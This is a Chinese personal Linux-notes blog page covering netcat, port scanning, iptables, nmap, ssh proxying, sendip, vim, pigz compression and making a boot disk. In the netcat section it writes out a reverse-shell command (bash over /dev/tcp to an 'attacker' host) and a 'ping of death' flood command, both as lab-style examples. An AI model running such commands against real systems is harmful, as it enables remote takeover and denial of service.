+<h5 id="反向传输"><a href="#反向传输" class="headerlink" title="反向传输"></a>反向传输</h5><p>当存在防火墙的时候,一般防火墙设置策略是:只会限制远程机器不能直接访问本机开放的特殊端口,但是并<code>不会限制本地机器访问远程机器</code>,这样可以使用反向shell,在<code>远程主机B上开启监听,墙内机器A nc连接 远程主机B</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">墙内主机A: nc 192.168.10.2 1234 &lt; xxx.txt</span><br><span class="line">远程主机B: nc -l 1234 &gt; xxx.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="主机B传输数据到主机A"><a href="#主机B传输数据到主机A" class="headerlink" title="主机B传输数据到主机A"></a>主机B传输数据到主机A</h4><p>如果想主机B传输数据到主机A,也对应正向反向两种,这里只用正向传输举例,反向传输类似</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机A: nc -l 1234 &gt; xxx.txt</span><br><span class="line">主机B: nc 192.168.10.1 1234 &lt; xxx.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件打包压缩后传输"><a href="#文件打包压缩后传输" class="headerlink" title="文件打包压缩后传输"></a>文件打包压缩后传输</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:tar -czvf - testdir/|nc 192.168.10.2 1234</span><br><span class="line">B:nc -l 1234   | pv -q -L 50m   | tar -xzi</span><br></pre></td></tr></table></figure>
+
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>参数解释:</p>
+<ul>
+<li>-z扫描模式</li>
+<li>-u探测udp</li>
+<li>-v 显示详细信息</li>
+<li>-n 以数字形式表示的IP地址</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz 1.1.1.1 1-65535</span><br><span class="line">nc -nvzu 1.1.1.1 1-1024</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程控制-反弹shell"><a href="#远程控制-反弹shell" class="headerlink" title="远程控制(反弹shell)"></a>远程控制(反弹shell)</h3><p>受害者主机主动连接攻击者的服务端程序,将自己的bash权限交给攻击者<br>受害者：<br>Ubuntu Linux ——&gt; 192.168.146.128<br>攻击者：<br>Kali Linux ——&gt; 192.168.146.129</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击者机器: nc -lvp 2333</span><br><span class="line">被攻击者: bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">Linux 反弹shell（二）反弹shell的本质</a></p>
+<h3 id="远程硬盘克隆-块级别拷贝"><a href="#远程硬盘克隆-块级别拷贝" class="headerlink" title="远程硬盘克隆(块级别拷贝)"></a>远程硬盘克隆(块级别拷贝)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 333| dd of=/dev/sda</span><br><span class="line">B:dd if=/dev/sda|nc -nv 1.1.1.1 333</span><br></pre></td></tr></table></figure>
+
+<h1 id="异常模拟"><a href="#异常模拟" class="headerlink" title="异常模拟"></a>异常模拟</h1><h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>service iptables status<br>service iptables start<br>iptables -I FORWARD -p tcp –dport 3306 -j DROP<br>iptables -I FORWARD -p tcp –dport 3306 -j ACCEPT<br>1、iptables -L<br>查看filter表的iptables规则，包括所有的链。filter表包含INPUT、OUTPUT、FORWARD三个规则链。<br>说明：-L是–list的简写，作用是列出规则。<br>2、iptables -L [-t 表名]<br>只查看某个表的中的规则。<br>说明：表名一共有三个：filter,nat,mangle，如果没有指定表名，则默认查看filter表的规则列表（就相当于第一条命令）。<br>举例：iptables -L -t filter</p>
+<h2 id="tc"><a href="#tc" class="headerlink" title="tc"></a>tc</h2><p>在某些情况下，我们需要模拟网络很差的状态来测试软件能够正常工作，比如网络延迟、丢包、乱序、重复等</p>
+<p><a href="https://www.hi-linux.com/posts/35699.html" target="_blank" rel="noopener">https://www.hi-linux.com/posts/35699.html</a></p>
+<h2 id="killcx"><a href="#killcx" class="headerlink" title="killcx"></a>killcx</h2><p>Linux环境下切断tcp连接,google搜索关键字:“close””tcp connection””linus”,开发调试的时候，为了模拟意外情况，需要在不影响服务进程的情况下单独 切断tcp连接,即 强制断开tcp连接。不能使用iptables,因为iptables的禁用对已经建立的tcp连接无效（这是由tcp的机制决定的）</p>
+<h3 id="Centos安装"><a href="#Centos安装" class="headerlink" title="Centos安装"></a>Centos安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.tu-chemnitz.de/pub/linux/dag/redhat/el6/en/x86_64/rpmforge/RPMS/perl-Net-RawIP-0.25-1.el6.rf.x86_64.rpm</span><br><span class="line">rpm -ivh perl-Net-RawIP-0.25-1.el6.rf.x86_64.rpm</span><br><span class="line">yum -y install perl-Net-Pcap.x86_64</span><br><span class="line">yum  -y install perl-NetPacket.noarch</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><code>perl killcx 127.0.0.1:1234 lo</code></p>
+<h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p><a href="https://cibifang.com/linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%A6%82%E4%BD%95%E5%88%87%E6%96%ADtcp%E8%BF%9E%E6%8E%A5/" target="_blank" rel="noopener">切断tcp连接,在linux环境下</a><br><a href="http://killcx.sourceforge.net/" target="_blank" rel="noopener">Killcx : close a TCP connection (for Linux)</a></p>
+<h1 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h1><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><h3 id="死亡ping"><a href="#死亡ping" class="headerlink" title="死亡ping"></a>死亡ping</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每0.01秒给192.168.10.147发送一个大小65500字节的icmp包</span></span><br><span class="line">ping 192.168.10.147 -i 0.01 -s 65500</span><br></pre></td></tr></table></figure>
+
+<h3 id="发送指定个数icmp数据包"><a href="#发送指定个数icmp数据包" class="headerlink" title="发送指定个数icmp数据包"></a>发送指定个数icmp数据包</h3><p>ping -c 3（ping3次） -q（不打出输出信息） <a href="http://www.baidu.com(网址)" target="_blank" rel="noopener">www.baidu.com(网址)</a></p>
+<h2 id="fping"><a href="#fping" class="headerlink" title="fping"></a>fping</h2><h2 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h2><h2 id="arping"><a href="#arping" class="headerlink" title="arping"></a>arping</h2><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bzip2 -cd nmap-7.60.tar.bz2 | tar xvf -</span><br><span class="line">cd nmap-7.60</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">su root</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://nmap.org/download.html#macosx" target="_blank" rel="noopener">安装</a></p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><a href="https://zhuanlan.zhihu.com/p/26676508" target="_blank" rel="noopener">【渗透神器系列】nmap</a></p>
+<p>扫描局域网内ip地址：</p>
+<p><code>nmap -sP 本地IP/24</code></p>
+<p>nmap -F -sT -v <a href="http://www.quar.com" target="_blank" rel="noopener">www.quar.com</a></p>
+<h1 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h1><h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><p>proxychains</p>
+<ul>
+<li>安装<br><a href="https://blog.csdn.net/weixin_42135399/article/details/82706083" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42135399/article/details/82706083</a></li>
+<li>测试：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://www.google.com/</span><br><span class="line">proxychains curl https://www.google.com/</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>实用socket5代理请求<br>ssh -qtfnN -D 127.0.0.1:1080 <a href="mailto:root@192.168.10.1" target="_blank" rel="noopener">root@192.168.10.1</a><br><a href="https://zhuanlan.zhihu.com/p/57630633" target="_blank" rel="noopener">ssh命令的三项代理功能</a></p>
+<p>-q<br>Quiet mode. Causes most warning and diagnostic messages to be suppressed.<br>-T<br>Disable pseudo-terminal allocation.<br>-D<br>[bind_address:]port]<br>-f<br>Requests ssh to go to background just before command execution. This is useful if ssh is going to ask for passwords or passphrases, but the user wants it in the background. This implies -n. The recommended way to start X11 pro-grams at a remote site is with something like ssh -f host xterm.If the ExitOnForwardFailure configuration option is set to ``yes’’, then a client started with -f will wait for all remote port forwards to be successfully established before placing itself in the background<br>-n<br>Redirects stdin from /dev/null (actually, prevents reading from stdin). This must be used when ssh is run in the background. A common trick is to use this to run X11 programs on a remote machine. For example, ssh -nshadows.cs.hut.fi emacs &amp; will start an emacs on shadows.cs.hut.fi, and the X11 connection will be automatically forwarded over an encrypted channel. The ssh program will be put in the background. (This does not work if ssh needs to ask for a password or passphrase; see also the -f option.)<br>-N<br>Do not execute a remote command. This is useful for just forwarding ports.</p>
+<h1 id="实用工具"><a href="#实用工具" class="headerlink" title="实用工具"></a>实用工具</h1><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><h2 id="sendip"><a href="#sendip" class="headerlink" title="sendip"></a>sendip</h2><p>linux网络IP发包工具</p>
+<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># http://www.earth.li/projectpurple/progs/sendip.html</span><br><span class="line">rpm -ivh sendip-2.5-1.i386.rpm</span><br><span class="line">error: Failed dependencies:</span><br><span class="line">    libc.so.6 is needed by sendip-2.5-1.i386</span><br><span class="line">    libc.so.6(GLIBC_2.0) is needed by sendip-2.5-1.i386</span><br><span class="line">    libc.so.6(GLIBC_2.1) is needed by sendip-2.5-1.i386</span><br><span class="line">    libc.so.6(GLIBC_2.1.3) is needed by sendip-2.5-1.i386</span><br><span class="line">    libc.so.6(GLIBC_2.3) is needed by sendip-2.5-1.i386</span><br><span class="line">    libdl.so.2 is needed by sendip-2.5-1.i386</span><br><span class="line">    libdl.so.2(GLIBC_2.0) is needed by sendip-2.5-1.i386</span><br><span class="line">    libdl.so.2(GLIBC_2.1) is needed by sendip-2.5-1.i386</span><br><span class="line">    libm.so.6 is needed by sendip-2.5-1.i386</span><br><span class="line">需要升级gcc版本</span><br><span class="line">gcc version 4.8.3 (GCC)可以安装</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p><a href="https://blog.csdn.net/freexploit/article/details/503954" target="_blank" rel="noopener">https://blog.csdn.net/freexploit/article/details/503954</a><br><a href="https://blog.csdn.net/zh_94/article/details/81660184" target="_blank" rel="noopener">https://blog.csdn.net/zh_94/article/details/81660184</a></p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
+<li>不能发送连续的数据包，所以需要配合脚本实现</li>
+<li>使用-v查看包是否正常<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sendip -p ipv4 -is 192.168.1.2 -id 192.168.1.1 -p icmp -d -x89ABCDEF www.baidu.com</span><br><span class="line">[root@server /tmp]#</span><br><span class="line">[root@server /tmp]# sendip -v -p ipv4 -is 192.168.1.2 -id 192.168.1.1 -p icmp -d -x89ABCDEF www.baidu.com</span><br><span class="line">Added 25 options</span><br><span class="line">Initializing module ipv4</span><br><span class="line">Initializing module icmp</span><br><span class="line">Finalizing module icmp</span><br><span class="line">Finalizing module ipv4</span><br><span class="line">Final packet data:</span><br><span class="line">45 00 00 22 E..&quot;</span><br><span class="line">E5 D2 00 00 ....</span><br><span class="line">FF 01 52 B4 ..R.</span><br><span class="line">C0 A8 01 02 ....</span><br><span class="line">C0 A8 01 01 ....</span><br><span class="line">08 00 C8 81 ....</span><br><span class="line">2D 78 38 39 -x89</span><br><span class="line">41 42 43 44 ABCD</span><br><span class="line">45 46 EF</span><br><span class="line">Sent 34 bytes to www.baidu.com</span><br><span class="line">Freeing module ipv4</span><br><span class="line">Freeing module icmp</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/28/Linux/nas/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/28/Linux/nas/" itemprop="url">未命名</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-28T08:27:41+08:00">
+                2019-12-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>#NAS</p>
+<h2 id="Ubuntu-安装nas"><a href="#Ubuntu-安装nas" class="headerlink" title="Ubuntu 安装nas"></a>Ubuntu 安装nas</h2><p>Docker 和 Docker Compose install<br><a href="https://www.jianshu.com/p/77a46925006c" target="_blank" rel="noopener">https://www.jianshu.com/p/77a46925006c</a></p>
+<p>sudo  docker-compose up -d</p>
+<p>mysql install</p>
+<p><a href="https://askubuntu.com/questions/364270/mount-error-unknown-filesystem-type-exfat" target="_blank" rel="noopener">https://askubuntu.com/questions/364270/mount-error-unknown-filesystem-type-exfat</a></p>
+<p><a href="https://askubuntu.com/questions/771473/mount-cant-find-device-in-etc-fstab/771496" target="_blank" rel="noopener">https://askubuntu.com/questions/771473/mount-cant-find-device-in-etc-fstab/771496</a></p>
+<p><a href="https://github.com/iikira/BaiduPCS-Go/wiki/%E7%BC%96%E8%AF%91-%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B8%AE%E5%8A%A9" target="_blank" rel="noopener">https://github.com/iikira/BaiduPCS-Go/wiki/%E7%BC%96%E8%AF%91-%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B8%AE%E5%8A%A9</a></p>
+<p>go get -u -v github.com/iikira/BaiduPCS-Go</p>
+<p>自动挂载目录<br><a href="https://www.cnblogs.com/EasonJim/p/7447000.html" target="_blank" rel="noopener">https://www.cnblogs.com/EasonJim/p/7447000.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/28/Linux/vim/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/28/Linux/vim/" itemprop="url">未命名</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-28T08:27:34+08:00">
+                2019-12-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h1><h2 id="快速移动"><a href="#快速移动" class="headerlink" title="快速移动"></a>快速移动</h2><p><a href="https://www.cnblogs.com/nerxious/archive/2012/12/21/2827303.html" target="_blank" rel="noopener">https://www.cnblogs.com/nerxious/archive/2012/12/21/2827303.html</a></p>
+<ul>
+<li>用z调整光标<br><code>z&lt;Enter&gt;</code>        将光标所在行移动到屏幕顶端<br>z.              将光标所在行移动到屏幕中间<br>z-              将光标所在行移动到屏幕低端<br>980z            快速到980行</li>
+</ul>
+<p><a href="https://harttle.land/2015/11/07/vim-cursor.html" target="_blank" rel="noopener">vim 快速移动</a></p>
+<p><a href="https://www.cnblogs.com/nerxious/archive/2012/12/21/2828520.html" target="_blank" rel="noopener">vim 快速删除</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/28/Linux/linux/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/28/Linux/linux/" itemprop="url">未命名</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-28T08:27:10+08:00">
+                2019-12-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h1><h2 id="并行压缩-注意cpu影响"><a href="#并行压缩-注意cpu影响" class="headerlink" title="并行压缩(注意cpu影响)"></a>并行压缩(注意cpu影响)</h2><p>常用压缩软件的发布：<br>压缩软件 | 使用的版本 | 第一个版本发布时间 | 最新版本号 | 最新版本发布时间<br>———|————|——————–|————|———–<br>gzip     | 1.5        | 1992.10.31         | 1.9        | 2018.2.7<br>pigz     | 2.3.4      |                    | 2.4.0      | 2017.12.26<br>bzip2    | 1.0.6      | 1996.07.18         | 1.0.6      | 2010.09.20<br>pbzip2   | 1.1.12     |                    | 1.1.13     | 2015-12-17<br>lbzip2   | 2.5        |                    | 2.5        | 2014-03-26<br>xz       | 5.2.2      |                    | 5.2.4      | 2018-04-29</p>
+<p>pigz作为多线程版本的gzip工具,只支持gzip格式<br>lbzip2/pbzip2作为多线程版本的bzip2工具,只支持bzip2格式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">yum install pzip</span><br><span class="line"></span><br><span class="line">压缩:(可以利用到多核cpu,cpu不是问题,非常快)</span><br><span class="line">tar --use-compress-program=pigz -cvpf rmcs_sys.tar.gz rmcs_sys.ful.20190421113500/</span><br><span class="line"></span><br><span class="line">16121 root      20   0 1814m  17m  584 S 977.8  0.1   3:40.30 pigz</span><br><span class="line">解压:并没有说的那么快?</span><br><span class="line">tar --use-compress-program=pigz -xvpf rmcs_sys.tar.gz -C  rmcs_sys</span><br><span class="line"></span><br><span class="line">18025 root      20   0 44024  852  576 R 132.2  0.0   0:24.76 pigz -d rmcs_sys</span><br><span class="line"></span><br><span class="line">tar --use-compress-program=pbzip2 -cvpf rmcs_sys.tar.gz rmcs_sys.ful.20190421113500/</span><br><span class="line"></span><br><span class="line">27995 root      20   0 1864m 187m  976 S 1386.0  0.6   1:39.94 pbzip2</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.51cto.com/wujianwei/2337287" target="_blank" rel="noopener">linux下多线程压缩命令pigz</a><br><a href="https://blog.csdn.net/vkingnew/article/details/82881220" target="_blank" rel="noopener">Linux 下压缩工具比对(gzip,bzip2,xz,pigz,lbzip2)</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/28/Linux/制作启动盘/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/28/Linux/制作启动盘/" itemprop="url">未命名</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-28T08:27:03+08:00">
+                2019-12-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="制作启动盘"><a href="#制作启动盘" class="headerlink" title="制作启动盘"></a>制作启动盘</h1><blockquote>
+<p>linux下我是直接使用fdisk去分区的，windows下我使用的是diskgenius，mac下我只能使用diskutil了</p>
+</blockquote>
+<h2 id="mac-下制作启动盘"><a href="#mac-下制作启动盘" class="headerlink" title="mac 下制作启动盘"></a>mac 下制作启动盘</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 卸载磁盘</span></span><br><span class="line">diskutil umountDisk /dev/disk2</span><br><span class="line"><span class="meta">#</span><span class="bash"> 擦除数据</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sudo dd <span class="keyword">if</span>=/dev/zero of=/dev/disk2 bs=1024 count=10</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 对磁盘进行分区,格式化</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> diskutil partitionDisk /dev/disk2 MBR FAT32 UNTITLED 0b</span></span><br><span class="line">diskutil partitionDisk disk2 GPT JHFS+ "My External HD" 0g</span><br><span class="line"><span class="meta">#</span><span class="bash"> 拷贝系统文件</span></span><br><span class="line">sudo dd if=kali-linux-2019.1a-amd64.iso of=/dev/disk2 bs=1m</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看dd拷贝进度</span></span><br><span class="line">sudo killall -29 dd</span><br><span class="line"><span class="meta">#</span><span class="bash"> 弹出磁盘</span></span><br><span class="line">diskutil eject /dev/disk2</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>mac os (日志式)，mac os（日志式，加密），mac os（区分大小写，日志式，加密），mac os（日志式，区分大小写）</p>
+</blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
